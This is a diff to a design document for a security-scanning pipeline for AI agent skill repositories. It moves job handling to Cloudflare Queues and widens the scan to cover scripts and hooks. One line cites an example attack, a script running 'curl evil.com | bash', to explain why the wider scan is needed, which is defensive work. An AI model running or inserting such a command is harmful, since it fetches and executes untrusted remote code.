@@ -640,17 +640,22 @@ Discovery → Fetch → Deduplicate → Scan (Tier 1) → Score → Store → Al
 
 ### 4.2 Worker Architecture
 
-The pipeline uses PostgreSQL as both the job queue and result store. No Redis or external queue is needed at this scale.
+The pipeline uses **Cloudflare Queues** for job distribution and PostgreSQL for result storage. Queues provide durable, at-least-once delivery natively within the Cloudflare Workers ecosystem.
+
+**Why Cloudflare Queues over PostgreSQL SKIP LOCKED**:
+- Native integration with Cloudflare Workers (no polling, push-based)
+- Durable message delivery with automatic retries
+- Free tier: 10,000 operations/day (write + read + delete = 3 ops per message)
+- At 500 submissions/day x 3 stages x 3 ops = ~4,500 ops/day — fits free tier
+- Max throughput: 5,000 messages/second per queue
+- Max batch: 100 messages, 256KB total
 
 ```typescript
 /**
- * Job queue using PostgreSQL advisory locks (SKIP LOCKED).
- * Workers pull jobs from the scan_jobs table, process them,
- * and write results back to scan_results.
- *
- * SKIP LOCKED ensures multiple workers do not process the
- * same job concurrently -- the first worker to claim a row
- * locks it, and subsequent workers skip it.
+ * Job queue using Cloudflare Queues.
+ * Source adapters and schedulers produce messages to the scan queue.
+ * Worker consumers process messages in batches.
+ * Results are stored in PostgreSQL.
  */
 interface ScanJob {
   id: string;                // UUID
@@ -660,98 +665,75 @@ interface ScanJob {
   content: string;           // SKILL.md content to scan
   contentHash: string;       // SHA-256 for dedup
   priority: number;          // 0-100 (higher = scan sooner)
-  status: 'pending' | 'processing' | 'completed' | 'failed' | 'skipped';
-  attempts: number;          // Retry count
-  maxAttempts: number;       // Default: 3
+  attempts: number;          // Retry count (managed by Queues)
   createdAt: string;
-  claimedAt: string | null;
-  completedAt: string | null;
-  workerId: string | null;   // Which worker instance claimed this job
-  error: string | null;      // Error message on failure
 }
 
-// Worker claims jobs with:
-// SELECT * FROM scan_jobs
-// WHERE status = 'pending'
-// ORDER BY priority DESC, created_at ASC
-// LIMIT 1
-// FOR UPDATE SKIP LOCKED;
+// wrangler.toml queue configuration:
+// [[queues.producers]]
+//   queue = "scan-pipeline"
+//   binding = "SCAN_QUEUE"
+//
+// [[queues.consumers]]
+//   queue = "scan-pipeline"
+//   max_batch_size = 10
+//   max_batch_timeout = 30
+//   max_retries = 3
+//   dead_letter_queue = "scan-dlq"
 ```
 
-**Worker process**:
+**Queue consumer** (push-based, no polling):
 
 ```typescript
-class ScanWorker {
-  private readonly workerId: string;
-  private readonly concurrency: number; // Default: 5
-
-  async run(): Promise<void> {
-    while (!this.shouldShutdown) {
-      const job = await this.claimJob();
-      if (!job) {
-        await delay(5000); // Poll interval when queue is empty
-        continue;
-      }
+/**
+ * Cloudflare Queue consumer.
+ * Configured in wrangler.toml as a queue consumer binding.
+ * Messages are pushed to the worker automatically — no polling loop needed.
+ */
+export default {
+  async queue(batch: MessageBatch<ScanJob>, env: Env): Promise<void> {
+    for (const message of batch.messages) {
+      const job = message.body;
 
       try {
-        const result = await this.processJob(job);
-        await this.completeJob(job.id, result);
+        // 1. Deduplication check
+        const lastScan = await getLastScanByHash(job.contentHash, env);
+        if (lastScan && lastScan.contentHash === job.contentHash) {
+          await storeResult({ ...lastScan, skipped: true, reason: 'content-unchanged' }, env);
+          message.ack();
+          continue;
+        }
+
+        // 2. Run Tier 1 scanning (static analysis)
+        const findings = await tier1Scan(job.content);
+
+        // 3. Compute scores
+        const securityScore = computeSecurityScore(findings);
+        const qualityDimensions = computeQualityDimensions(job);
+
+        // 4. Determine if Tier 2 (LLM) scanning is needed
+        const needsTier2 = shouldEscalateToTier2(findings, securityScore);
+
+        // 5. Snapshot content for diff analysis
+        const snapshot = { content: job.content, hash: job.contentHash, capturedAt: new Date().toISOString() };
+
+        // 6. Store result in PostgreSQL
+        await storeResult({ jobId: job.id, skillId: job.skillId, findings, securityScore, qualityDimensions, needsTier2, snapshot, scannedAt: new Date().toISOString() }, env);
+
+        // 7. Acknowledge message (removes from queue)
+        message.ack();
       } catch (err) {
-        await this.failJob(job.id, err);
+        // Retry with exponential backoff (up to 3 retries, managed by Queues)
+        message.retry({ delaySeconds: Math.min(300, 30 * (message.attempts + 1)) });
       }
     }
-  }
-
-  private async processJob(job: ScanJob): Promise<ScanResult> {
-    // 1. Deduplication check
-    const lastScan = await this.getLastScanByHash(job.contentHash);
-    if (lastScan && lastScan.contentHash === job.contentHash) {
-      // Content unchanged since last scan -- reuse results
-      return { ...lastScan, skipped: true, reason: 'content-unchanged' };
-    }
-
-    // 2. Run Tier 1 scanning (static analysis)
-    const findings = await this.tier1Scan(job.content);
-
-    // 3. Compute scores
-    const securityScore = this.computeSecurityScore(findings);
-    const qualityDimensions = this.computeQualityDimensions(job);
-
-    // 4. Determine if Tier 2 (LLM) scanning is needed
-    const needsTier2 = this.shouldEscalateToTier2(findings, securityScore);
-
-    // 5. Snapshot content for diff analysis
-    const snapshot = {
-      content: job.content,
-      hash: job.contentHash,
-      capturedAt: new Date().toISOString(),
-    };
-
-    return {
-      jobId: job.id,
-      skillId: job.skillId,
-      findings,
-      securityScore,
-      qualityDimensions,
-      needsTier2,
-      snapshot,
-      scannedAt: new Date().toISOString(),
-    };
-  }
-}
+  },
+};
 ```
 
-### 4.3 Parallelism and Concurrency
+### 4.3 Throughput
 
-| Parameter | Default | Range | Notes |
-|-----------|---------|-------|-------|
-| `WORKER_COUNT` | 2 | 1-10 | Number of worker processes |
-| `CONCURRENCY_PER_WORKER` | 5 | 1-20 | Concurrent jobs per worker |
-| `MAX_TOTAL_CONCURRENCY` | 10 | 2-50 | Global cap across all workers |
-| `POLL_INTERVAL_MS` | 5000 | 1000-30000 | Queue polling interval when empty |
-| `JOB_TIMEOUT_MS` | 60000 | 10000-300000 | Maximum time per scan job |
-
-At default settings (2 workers, 5 concurrency each = 10 parallel scans), the pipeline can process approximately:
+Cloudflare Queues support 5,000 messages/second per queue. At typical scan latency:
 - **Static-only scans**: ~10/second (100ms per scan) = **864,000/day**
 - **With content fetch**: ~2/second (500ms fetch + 100ms scan) = **172,800/day**
 
@@ -820,6 +802,27 @@ interface DeduplicationCheck {
 ```
 
 This is particularly effective for the weekly full-catalog rescan: if 95% of 36K skills are unchanged, only 1,800 skills need actual scanning -- reducing a 36,000-job run to 1,800 actual scans plus 34,200 hash comparisons (which take microseconds).
+
+### 4.6 Full Repository Scanning Scope
+
+The pipeline performs a **shallow clone** (depth=1) of each skill repository and scans all non-binary files, not just SKILL.md. This catches attacks that hide payloads in referenced scripts, hooks, or configuration files.
+
+**Scan scope**:
+- SKILL.md (primary content)
+- `scripts/*.sh`, `scripts/*.py`, `scripts/*.ts` (helper scripts)
+- `hooks/` directory (lifecycle hooks)
+- `.json`, `.yaml`, `.yml` config files in skill root
+- Any file explicitly referenced in SKILL.md (via path detection regex)
+
+**Limits**:
+- Individual file size: max 100KB (skip larger files)
+- Total scan payload: max 1MB per skill repository
+- Binary files: excluded (detected by null byte check)
+- Symlinks: not followed (flagged as structural violation)
+
+**Content hashing**: The deduplication hash (SHA-256) is computed over the combined content of SKILL.md + all scanned repo files. This ensures that changes to any file in the skill directory trigger a rescan.
+
+**Rationale**: A SKILL.md can contain `scripts/payload.sh` which executes `curl evil.com | bash`. Scanning only SKILL.md would miss this entirely. The shallow clone approach adds ~2-5 seconds per skill but catches the most common attack vector documented by Snyk.
 
 ---
 
@@ -1129,13 +1132,13 @@ At launch, the pipeline must handle:
 
 ### 7.2 Horizontal Scaling
 
-The PostgreSQL SKIP LOCKED pattern enables trivial horizontal scaling:
+Cloudflare Queues handle scaling automatically:
 
-1. **Single server (launch)**: 1 server, 2 worker processes, 10 concurrent scans. Capacity: ~170K scans/day.
-2. **Multi-process (growth)**: 1 server, 5 worker processes, 25 concurrent scans. Capacity: ~430K scans/day.
-3. **Multi-server (scale)**: N servers, each running 2-5 workers. All workers poll the same PostgreSQL scan_jobs table. SKIP LOCKED ensures no duplicate processing. Linear scaling.
+1. **Launch**: Single queue, single consumer Worker. Cloudflare auto-scales consumer instances based on queue depth.
+2. **Growth**: Multiple queues by priority (critical, standard, backfill). Each queue has independent consumer scaling.
+3. **Scale**: 5,000 messages/second per queue. Add queues to partition by source or priority.
 
-No application-level coordination is needed between workers. PostgreSQL handles all locking and job distribution.
+No manual instance management needed. Cloudflare's serverless model handles all scaling automatically.
 
 ### 7.3 Content Caching
 
@@ -1151,12 +1154,14 @@ To reduce GitHub API calls and fetch latency:
 | Resource | Provider | Monthly Cost | Notes |
 |---------|----------|-------------|-------|
 | **PostgreSQL** | Neon (free tier) → Neon Pro | $0 - $19/mo | Free tier: 0.5 GB storage, auto-suspend. Pro: 10 GB, always-on. |
-| **Compute (workers)** | Fly.io / Railway | $5 - $25/mo | 1 shared-cpu instance runs 2 workers comfortably. Scale to 2 instances for $10-50/mo. |
+| **Compute (workers)** | Cloudflare Workers | $0 - $5/mo | Free: 100K requests/day. Paid: $5/mo for 10M requests. |
+| **Cloudflare Queues** | Cloudflare | $0 | Free: 10K ops/day. Paid: $0.40/M ops after 1M/month included. |
+| **Workers AI (Tier 2)** | Cloudflare | $0 - $45/mo | Free: ~10K neurons/day. At 500 scans/day: ~$45/month. |
 | **GitHub API** | Free (PAT) | $0 | 5,000 req/hr per token. 2-3 tokens = no cost. |
 | **Resend (email)** | Free tier → Growth | $0 - $20/mo | Free: 100 emails/day. Growth: 50K emails/mo. |
 | **Content storage** | PostgreSQL (included) | $0 | 36K skills x 10KB avg = 360 MB. Fits in Neon Pro. |
-| **Total (launch)** | | **$5 - $64/mo** | |
-| **Total (scale: 200K skills)** | | **$50 - $200/mo** | Larger DB, 2-3 compute instances. |
+| **Total (launch)** | | **$0 - $45/mo** | Free tier covers everything except Workers AI at scale. |
+| **Total (scale: 200K skills)** | | **~$65 - $100/mo** | Larger DB + Workers AI at scale. No instance management. |
 
 ### 7.5 Growth Projections
 
@@ -1168,7 +1173,7 @@ To reduce GitHub API calls and fetch latency:
 | DB size | 500 MB | 2 GB | 5 GB | 15 GB |
 | Worker instances | 1 | 1-2 | 2-3 | 3-5 |
 
-The PostgreSQL-based architecture handles all of these projections without architectural changes. The only scaling action is adding worker instances and upgrading the database plan.
+The Cloudflare-native architecture handles all of these projections without architectural changes. Scaling is automatic — no manual instance management needed.
 
 ---
 
@@ -1200,7 +1205,7 @@ flowchart TB
     end
 
     subgraph Pipeline["Scanning Pipeline"]
-        QUEUE["PostgreSQL Job Queue\nSKIP LOCKED\nPriority ordering"]
+        QUEUE["Cloudflare Queues\nPush-based delivery\nPriority queues"]
         W1["Worker 1"]
         W2["Worker 2"]
         WN["Worker N"]
@@ -1279,7 +1284,7 @@ flowchart TB
 ```mermaid
 stateDiagram-v2
     [*] --> pending: Job created by\nadapter or scheduler
-    pending --> processing: Worker claims\n(SKIP LOCKED)
+    pending --> processing: Worker receives\n(Queues push)
     processing --> completed: Scan succeeded\nResults stored
     processing --> failed: Error occurred\n(attempt < max)
     failed --> pending: Retry with\nexponential backoff
